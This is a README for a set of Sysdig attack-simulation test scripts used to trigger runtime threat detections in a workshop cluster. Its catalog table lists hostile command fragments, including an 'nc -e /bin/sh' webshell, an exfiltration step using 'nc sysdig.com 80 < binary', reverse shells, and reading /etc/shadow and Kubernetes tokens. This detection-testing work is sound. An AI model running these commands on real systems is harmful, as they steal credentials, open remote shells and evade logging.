# sysevent tests

Security-event generator tests extracted from the public Sysdig demo image
**`marcelsysdig/sysevent:2.0.0`** (`/home/eval/bin/*.sysdig`).

Each script echoes a short description, then performs **one realistic action**
that a corresponding Sysdig Secure runtime rule is designed to detect. They are
intended to be run **inside a workshop/test container or pod** to generate
named runtime detections (drift, reverse shells, crypto-mining, K8s token
theft, etc.) so the threat-detection policies can be exercised end-to-end.

> ⚠️ These are deliberate **attack-simulation** scripts. Run them only inside
> the workshop's throwaway cluster/containers — never on a real host.

## Catalog

Severity: **m** = medium, **h** = high. `ms` = multi-stage chain.

| Script | Sev | What it does |
|---|---|---|
| `modify_binary_dirs.sh` | m | Copies a binary into a binary dir (`/bin/id2`) |
| `remove_bulk_data_from_disk.sh` | m | `shred` of `~/.bash_history` |
| `modify_ld_so_preload.sh` | m | Writes `/etc/ld.so.preload` (hidden-process technique) |
| `find_azure_credentials.sh` | h | `find` for `azure.json` |
| `detect_crypto_miners_using_the_stratum_protocol.sh` | h | `cgminer -o stratum+tcp://...` |
| `reconnaissance_attempt_to_find_SUID_binaries.sh` | m | Enumerate SUID binaries as another user |
| `log_file_symlink_to_null.sh` | h | Symlink `auth.log` → `/dev/null` |
| `kill_known_malicious_process.sh` | h | `pkill -f pastebin` |
| `tampering_with_security_software_in_container.sh` | h | `sysctl kernel.nmi_watchdog=0` |
| `base64-encoded_python_script_execution.sh` | h | Base64-decoded Python exec |
| `dump_memory_for_credentials.sh` | m | `cat /proc/$$/maps` |
| `read_sensitive_file_untrusted.sh` | m | `cat /etc/shadow` |
| `netcat_remote_code_execution_in_container.sh` | m | Webshell POST spawning `nc -e /bin/sh` |
| `contact_EC2_instance_metadata_service_from_container.sh` | m | curl to `169.254.169.254` IMDS |
| `create_symlink_over_sensitive_files.sh` | h | Symlink over `/etc/shadow` |
| `find_private_keys_or_passwords.sh` | m | `find /root -name id_rsa` |
| `dns_lookup_for_offensive_security_tool_omain_detected.sh` | h | DNS/curl to `*.oastify.com` |
| `network_relay_binary_exfiltration_activities_detected.sh` | h | `nc sysdig.com 80 < binary` |
| `code_compiler_downloaded_and_launched_in_container.sh` | m | `gcc` invocation in container |
| `malicious_ips_or_domains_detected_on_command_line.sh` | h | curl to a known-bad miner domain |
| `create_hardlink_over_sensitive_files.sh` | h | Hardlink over `/etc/shadow` |
| `diamorphine_rootkit_activity.sh` | h | `kill -63` (Diamorphine signal) |
| `base64-encoded_shell_script_execution.sh` | h | Base64-decoded shell exec |
| `read_k8s_service_account_token_from_terminal.sh` | h | `cat .../serviceaccount/token` |
| `reverse_shell_detected_sh.sh` | h | PHP `fsockopen` → `/bin/sh` reverse shell |
| `reverse_shell_detected_python.sh` | h | Python `socket`+`subprocess` reverse shell |
| `gpg_key_reconnaissance.sh` | h | `find *.gpg` / `gpg --list-keys` |
| `malware_detection.sh` | h | Downloads + executes the EICAR test file |
| `simulated_attack_chain.sh` | h, ms | **7-stage** chain: access→discovery→creds→persistence→evasion→C2→exfil |
| `k8s_cluster_takeover_and_cryptominer.sh` | h, ms | **10-stage** chain: reverse shell → SA token → K8s API → xmrig → exfil |
| `detect_reconnaissance_scripts_executing_LinEnum.sh` | — | Downloads + runs `LinEnum.sh` (not in upstream menu) |

### `archive/`
Older tests kept for reference:
- `read_shell_configuration_file.sh` — non-shell process reads `/etc/profile`
- `webserver_writing_to_non-allowed_directory.sh` — webshell writes into `uploads/`

## Provenance / refresh

To re-extract from the image:

```bash
docker run --rm --entrypoint find marcelsysdig/sysevent:2.0.0 \
  /home/eval/bin -name '*.sysdig'
```

The two multi-stage chains use **real in-cluster targets** (the pod's own DNS
nameserver for reverse shells, `KUBERNETES_SERVICE_HOST` for API calls, real
miner pool hostnames), which is what makes them actually trigger detections.
